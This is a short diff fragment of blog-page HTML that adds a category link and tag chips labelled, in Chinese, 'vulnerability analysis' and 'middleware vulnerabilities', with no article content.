+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-category">
+                                    漏洞分析
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">中间件漏洞</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                        <span class="chip bg-color">漏洞分析</span>
                     </a>
                     
                 </div>
